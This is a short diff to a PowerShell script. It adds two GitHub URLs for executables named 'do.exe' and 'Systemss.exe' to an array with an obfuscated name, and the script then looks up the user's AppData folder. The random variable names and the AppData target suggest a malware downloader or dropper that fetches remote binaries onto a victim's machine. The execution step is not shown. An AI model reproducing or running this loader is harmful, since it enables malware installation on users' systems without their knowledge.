@@ -1,5 +1,6 @@
 $gfgff = @(
-    ""
+    "https://github.com/jarkacorp/unicaleblaniys/raw/refs/heads/main/do.exe",
+ "https://github.com/jarkacorp/unicaleblaniys/raw/refs/heads/main/Systemss.exe"
 )
 $dfsgsfdg = [Environment]::GetFolderPath('ApplicationData')
 
